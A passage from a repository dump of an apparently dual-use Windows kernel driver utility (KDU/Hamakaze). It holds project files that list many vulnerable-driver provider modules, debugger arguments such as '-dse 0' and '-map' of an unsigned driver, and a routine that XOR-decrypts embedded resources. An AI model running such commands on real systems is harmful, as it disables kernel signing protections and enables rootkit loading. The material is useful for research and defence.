    <ClCompile Include="idrv\echodrv.cpp" />
    <ClCompile Include="idrv\evga.cpp" />
    <ClCompile Include="idrv\gmer.cpp" />
    <ClCompile Include="idrv\hilscher.cpp" />
    <ClCompile Include="idrv\hp.cpp" />
    <ClCompile Include="idrv\kph.cpp" />
    <ClCompile Include="idrv\lenovo.cpp" />
    <ClCompile Include="idrv\lha.cpp" />
    <ClCompile Include="idrv\mapmem.cpp" />
    <ClCompile Include="idrv\marvinhw.cpp" />
    <ClCompile Include="idrv\mimidrv.cpp" />
    <ClCompile Include="idrv\netease.cpp" />
    <ClCompile Include="idrv\nvidia.cpp" />
    <ClCompile Include="idrv\phymem.cpp" />
    <ClCompile Include="idrv\procexp.cpp" />
    <ClCompile Include="idrv\amd.cpp" />
    <ClCompile Include="idrv\rzpnk.cpp" />
    <ClCompile Include="idrv\tpup.cpp" />
    <ClCompile Include="idrv\tpw.cpp" />
    <ClCompile Include="idrv\winio.cpp" />
    <ClCompile Include="idrv\intel.cpp" />
    <ClCompile Include="idrv\rtcore.cpp" />
    <ClCompile Include="idrv\winring0.cpp" />
    <ClCompile Include="idrv\zemana.cpp" />
    <ClCompile Include="idrv\zodiacon.cpp" />
    <ClCompile Include="ipcsvc.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="kduprov.cpp" />
    <ClCompile Include="pagewalk.cpp" />
    <ClCompile Include="ps.cpp" />
    <ClCompile Include="shellcode.cpp" />
    <ClCompile Include="sup.cpp" />
    <ClCompile Include="diag.cpp" />
    <ClCompile Include="sym.cpp" />
    <ClCompile Include="tests.cpp" />
    <ClCompile Include="victim.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Shared\consts.h" />
    <ClInclude Include="..\Shared\kdubase.h" />
    <ClInclude Include="..\Shared\ldr\ldr.h" />
    <ClInclude Include="..\Shared\minirtl\cmdline.h" />
    <ClInclude Include="..\Shared\minirtl\minirtl.h" />
    <ClInclude Include="..\Shared\minirtl\rtltypes.h" />
    <ClInclude Include="..\Shared\minirtl\_filename.h" />
    <ClInclude Include="..\Shared\ntos\halamd64.h" />
    <ClInclude Include="..\Shared\ntos\ntalpc.h" />
    <ClInclude Include="..\Shared\ntos\ntbuilds.h" />
    <ClInclude Include="..\Shared\ntos\ntos.h" />
    <ClInclude Include="..\Shared\ntos\ntsup.h" />
    <ClInclude Include="..\Shared\thirdparty\tinyaes\aes.h" />
    <ClInclude Include="..\Shared\thirdparty\whirlpool\nessie.h" />
    <ClInclude Include="..\Shared\thirdparty\whirlpool\whirlpool.h" />
    <ClInclude Include="compress.h" />
    <ClInclude Include="drvmap.h" />
    <ClInclude Include="dsefix.h" />
    <ClInclude Include="global.h" />
    <ClInclude Include="hde\hde64.h" />
    <ClInclude Include="idrv\alcpu.h" />
    <ClInclude Include="idrv\asrdrv.h" />
    <ClInclude Include="idrv\atszio.h" />
    <ClInclude Include="idrv\binalyze.h" />
    <ClInclude Include="idrv\dbk.h" />
    <ClInclude Include="idrv\echodrv.h" />
    <ClInclude Include="idrv\evga.h" />
    <ClInclude Include="idrv\hilscher.h" />
    <ClInclude Include="idrv\hp.h" />
    <ClInclude Include="idrv\ldrsc.h" />
    <ClInclude Include="idrv\dell.h" />
    <ClInclude Include="idrv\directio64.h" />
    <ClInclude Include="idrv\gmer.h" />
    <ClInclude Include="idrv\kph.h" />
    <ClInclude Include="idrv\lenovo.h" />
    <ClInclude Include="idrv\lha.h" />
    <ClInclude Include="idrv\mapmem.h" />
    <ClInclude Include="idrv\marvinhw.h" />
    <ClInclude Include="idrv\mimidrv.h" />
    <ClInclude Include="idrv\netease.h" />
    <ClInclude Include="idrv\nvidia.h" />
    <ClInclude Include="idrv\phymem.h" />
    <ClInclude Include="idrv\procexp.h" />
    <ClInclude Include="idrv\amd.h" />
    <ClInclude Include="idrv\rzpnk.h" />
    <ClInclude Include="idrv\tpup.h" />
    <ClInclude Include="idrv\tpw.h" />
    <ClInclude Include="idrv\winio.h" />
    <ClInclude Include="idrv\intel.h" />
    <ClInclude Include="idrv\rtcore.h" />
    <ClInclude Include="idrv\winring0.h" />
    <ClInclude Include="idrv\zemana.h" />
    <ClInclude Include="idrv\zodiacon.h" />
    <ClInclude Include="ipcsvc.h" />
    <ClInclude Include="shellcode.h" />
    <ClInclude Include="diag.h" />
    <ClInclude Include="sig.h" />
    <ClInclude Include="sym.h" />
    <ClInclude Include="wdksup.h" />
    <ClInclude Include="kduplist.h" />
    <ClInclude Include="kduprov.h" />
    <ClInclude Include="pagewalk.h" />
    <ClInclude Include="ps.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="sup.h" />
    <ClInclude Include="tests.h" />
    <ClInclude Include="victim.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\274.ico" />
  </ItemGroup>
  <ItemGroup>
    <None Include="res\SB_SMBUS_SDK.bin" />
    <None Include="res\Taigei32.bin" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="shellmasm.asm" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`Source/Hamakaze/KDU.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{f7a995c4-ab5e-4da5-8c67-b786e28b68e0}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\idrv">
      <UniqueIdentifier>{62c72812-4f0a-4b4e-a30d-4f7eee638cc3}</UniqueIdentifier>
    </Filter>
    <Filter Include="hde">
      <UniqueIdentifier>{3ec0ce53-a8de-4985-b6d0-dc01135c1d91}</UniqueIdentifier>
    </Filter>
    <Filter Include="ntos">
      <UniqueIdentifier>{1df1a36e-45d4-430a-a401-9415b50be4bd}</UniqueIdentifier>
    </Filter>
    <Filter Include="ldr">
      <UniqueIdentifier>{f8e96a37-9fb4-4dd5-a6aa-a517a8f1d6db}</UniqueIdentifier>
    </Filter>
    <Filter Include="thirdparty">
      <UniqueIdentifier>{98544574-94e6-4641-b98d-4a06905c61bd}</UniqueIdentifier>
    </Filter>
    <Filter Include="thirdparty\tinyaes">
      <UniqueIdentifier>{c53b77e9-0d5d-4eb3-91d8-1b71f16abd1d}</UniqueIdentifier>
    </Filter>
    <Filter Include="thirdparty\whirlpool">
      <UniqueIdentifier>{a336b00d-e024-4c89-9e15-64de5a7c6257}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="sup.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="drvmap.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ps.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kduprov.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="victim.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\intel.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\rtcore.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="hde\hde64.c">
      <Filter>hde</Filter>
    </ClCompile>
    <ClCompile Include="pagewalk.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="compress.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\mapmem.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="tests.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\atszio.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\winio.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\winring0.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="dsefix.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\phymem.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="shellcode.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\lha.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_filename.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcmp.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strncpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\cmdline.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\strtou64.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\strtoul.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\u64tohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="idrv\directio64.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\gmer.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\dell.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\mimidrv.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\kph.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\ldr\ldr.cpp">
      <Filter>ldr</Filter>
    </ClCompile>
    <ClCompile Include="idrv\procexp.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\dbk.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="ipcsvc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\ntos\ntsup.c">
      <Filter>ntos</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\minirtl\_strncmp.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="diag.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\marvinhw.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\zemana.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\asrdrv.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\alcpu.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\amd.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\hilscher.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\lenovo.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="sym.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="idrv\hp.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\zodiacon.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\echodrv.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\thirdparty\tinyaes\aes.c">
      <Filter>thirdparty\tinyaes</Filter>
    </ClCompile>
    <ClCompile Include="..\Shared\thirdparty\whirlpool\whirlpool.c">
      <Filter>thirdparty\whirlpool</Filter>
    </ClCompile>
    <ClCompile Include="idrv\nvidia.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\binalyze.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\rzpnk.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\evga.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\netease.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\tpup.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
    <ClCompile Include="idrv\tpw.cpp">
      <Filter>Source Files\idrv</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="global.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="sup.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="drvmap.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="wdksup.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ps.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kduprov.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="victim.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\intel.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\rtcore.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="hde\hde64.h">
      <Filter>hde</Filter>
    </ClInclude>
    <ClInclude Include="pagewalk.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="compress.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\mapmem.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\atszio.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\winio.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\winring0.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="dsefix.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kduplist.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\phymem.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="shellcode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\lha.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ntos\halamd64.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ntos\ntos.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\_filename.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\cmdline.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\minirtl.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\minirtl\rtltypes.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="idrv\directio64.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ntos\ntbuilds.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="idrv\gmer.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\dell.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\mimidrv.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\kph.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ldr\ldr.h">
      <Filter>ldr</Filter>
    </ClInclude>
    <ClInclude Include="idrv\procexp.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\dbk.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\ldrsc.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="ipcsvc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ntos\ntalpc.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="tests.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\ntos\ntsup.h">
      <Filter>ntos</Filter>
    </ClInclude>
    <ClInclude Include="diag.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\marvinhw.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\zemana.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\consts.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\kdubase.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\asrdrv.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="sig.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\alcpu.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\amd.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\hilscher.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\lenovo.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="sym.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="idrv\hp.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\zodiacon.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\echodrv.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\thirdparty\tinyaes\aes.h">
      <Filter>thirdparty\tinyaes</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\thirdparty\whirlpool\nessie.h">
      <Filter>thirdparty\whirlpool</Filter>
    </ClInclude>
    <ClInclude Include="..\Shared\thirdparty\whirlpool\whirlpool.h">
      <Filter>thirdparty\whirlpool</Filter>
    </ClInclude>
    <ClInclude Include="idrv\nvidia.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\binalyze.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\rzpnk.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\evga.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\netease.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\tpup.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
    <ClInclude Include="idrv\tpw.h">
      <Filter>Source Files\idrv</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\274.ico">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
  <ItemGroup>
    <None Include="res\SB_SMBUS_SDK.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="res\Taigei32.bin">
      <Filter>Resource Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="shellmasm.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`Source/Hamakaze/KDU.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>-dse 6</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArgumentsHistory>-ps 444|-test|-dsefix 0|-dse 0|-dse 6|</LocalDebuggerCommandArgumentsHistory>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LocalDebuggerCommandArguments>-prv 56 -map c:\Install\dummy2.sys</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
    <LocalDebuggerCommandArgumentsHistory>-prv 53 -dse 0|-prv 53 -dse 6|-prv 55 -map c:\Install\dummy.sys|-prv 55 -map c:\Install\dummy2.sys|-prv 56 -map c:\Install\dummy2.sys|</LocalDebuggerCommandArgumentsHistory>
  </PropertyGroup>
</Project>
```

`Source/Hamakaze/compress.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2023
*
*  TITLE:       COMPRESS.CPP
*
*  VERSION:     1.31
*
*  DATE:        08 Apr 2023
*
*  Compression support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <msdelta.h>

#pragma comment(lib, "msdelta.lib")

/*
* EncodeBuffer
*
* Purpose:
*
* Decrypt/Encrypt given buffer.
*
*/
VOID EncodeBuffer(
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ ULONG Key
)
{
    ULONG k, c;
    PUCHAR ptr;

    if ((Buffer == NULL) || (BufferSize == 0))
        return;

    k = Key;
    c = BufferSize;
    ptr = (PUCHAR)Buffer;

    do {
        *ptr ^= k;
        k = _rotl(k, 1);
        ptr++;
        --c;
    } while (c != 0);
}

/*
* KDULoadResource
*
* Purpose:
*
* Access and decompress resource.
*
* N.B. Use supHeapFree to release memory allocated for the decompressed buffer.
*
*/
PVOID KDULoadResource(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize,
    _In_ ULONG DecryptKey,
    _In_ BOOLEAN VerifyChecksum
)
{
    PBYTE dataPtr;
    ULONG dataSize = 0;
    SIZE_T decompressedSize = 0;

    if (DataSize)
        *DataSize = 0;

    dataPtr = supQueryResourceData(ResourceId,
        DllHandle,
        &dataSize);

    if (dataPtr && dataSize) {

        dataPtr = (PBYTE)KDUDecompressResource(dataPtr,
            dataSize,
            &decompressedSize,
            DecryptKey,
            VerifyChecksum);

        if (DataSize)
            *DataSize = (ULONG)decompressedSize;

        return dataPtr;

    }

    return NULL;
}

/*
* KDUDecompressResource
*
* Purpose:
*
* Decompress resource and return pointer to decompressed data.
*
* N.B. Use supHeapFree to release memory allocated for the decompressed buffer.
*
*/
PVOID KDUDecompressResource(
    _In_ PVOID ResourcePtr,
    _In_ SIZE_T ResourceSize,
    _Out_ PSIZE_T DecompressedSize,
    _In_ ULONG DecryptKey,
    _In_ BOOLEAN VerifyChecksum
)
{
    BOOLEAN bValidData;
    DELTA_INPUT diDelta, diSource;
    DELTA_OUTPUT doOutput;
    PVOID resultPtr = NULL, dataBlob;

    *DecompressedSize = 0;

    RtlSecureZeroMemory(&diSource, sizeof(DELTA_INPUT));
    RtlSecureZeroMemory(&diDelta, sizeof(DELTA_INPUT));
    RtlSecureZeroMemory(&doOutput, sizeof(DELTA_OUTPUT));

    dataBlob = supHeapAlloc(ResourceSize);
    if (dataBlob) {
        RtlCopyMemory(dataBlob, ResourcePtr, ResourceSize);
        EncodeBuffer(dataBlob, (ULONG)ResourceSize, DecryptKey);

        diDelta.Editable = FALSE;
        diDelta.lpcStart = dataBlob;
        diDelta.uSize = ResourceSize;

        if (ApplyDeltaB(DELTA_FILE_TYPE_RAW, diSource, diDelta, &doOutput)) {
            
            SIZE_T newSize = doOutput.uSize;
            PVOID decomPtr = doOutput.lpStart;

            bValidData = TRUE;

            if (VerifyChecksum) {

                ULONG headerSum = 0, calcSum = 0;

                bValidData = supVerifyMappedImageMatchesChecksum(decomPtr,
                    (ULONG)newSize,
                    &headerSum,
                    &calcSum);

                if (bValidData == FALSE) {
                    
                    supPrintfEvent(kduEventError, 
                        "[!] Error data checksum mismatch! Header sum 0x%lx, calculated sum 0x%lx\r\n",
                        headerSum, 
                        calcSum);

                }
            }
            else {
                printf_s("[+] Checksum verification skipped\r\n");
            }

            if (bValidData) {
                resultPtr = (PVOID)supHeapAlloc(newSize);
                if (resultPtr) {
                    RtlCopyMemory(resultPtr, decomPtr, newSize);
                    *DecompressedSize = newSize;
                }
            }

            DeltaFree(doOutput.lpStart);

        }
        else {
            
            supShowWin32Error("[!] Error while decompressing resource", GetLastError());

        }

        supHeapFree(dataBlob);
    }

    return resultPtr;
}

```

`Source/Hamakaze/compress.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2021
*
*  TITLE:       COMPRESS.H
*
*  VERSION:     1.11
*
*  DATE:        18 Apr 2021
*
*  Compression support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

VOID EncodeBuffer(
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ ULONG Key);

PVOID KDULoadResource(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize,
    _In_ ULONG DecryptKey,
    _In_ BOOLEAN VerifyChecksum);

PVOID KDUDecompressResource(
    _In_ PVOID ResourcePtr,
    _In_ SIZE_T ResourceSize,
    _Out_ PSIZE_T DecompressedSize,
    _In_ ULONG DecryptKey,
    _In_ BOOLEAN VerifyChecksum);


```

`Source/Hamakaze/diag.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2025
*
*  TITLE:       DIAG.CPP
*
*  VERSION:     1.45
*
*  DATE:        30 Nov 2025
*
*  Hamakaze system diagnostics component.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

BOOLEAN g_ConsoleOutput = TRUE;

typedef struct _OBJENUMPARAM {
    PWSTR ObjectDirectory;
    PUNICODE_STRING ObjectType;
} OBJENUMPARAM, * POBJENUMPARAM;

NTSTATUS NTAPI EnumObjectsCallback(
    _In_ POBJECT_DIRECTORY_INFORMATION Entry,
    _In_ PVOID CallbackParam
)
{
    POBJENUMPARAM Param = (POBJENUMPARAM)CallbackParam;

    if (RtlEqualUnicodeString(&Entry->TypeName, Param->ObjectType, TRUE)) {
        printf_s("\t%ws -> %wZ\r\n", Param->ObjectDirectory, &Entry->Name);
    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS EmptyWorkingSet()
{
    NTSTATUS ntStatus;
    QUOTA_LIMITS quotaLimits;

    ntStatus = NtQueryInformationProcess(NtCurrentProcess(),
        ProcessQuotaLimits,
        &quotaLimits,
        sizeof(quotaLimits),
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus;
    }

    quotaLimits.MinimumWorkingSetSize = (SIZE_T)-1;
    quotaLimits.MaximumWorkingSetSize = (SIZE_T)-1;

    return NtSetInformationProcess(NtCurrentProcess(),
        ProcessQuotaLimits,
        &quotaLimits,
        sizeof(quotaLimits));

}

VOID KDUPrintBooleanValueWithColor(
    _In_ CONST char* Name,
    _In_ BOOLEAN Value
)
{
#define PRINTGRN  "\x1B[32m"
#define PRINTWHT "\x1B[37m"

    if (g_ConsoleOutput) {

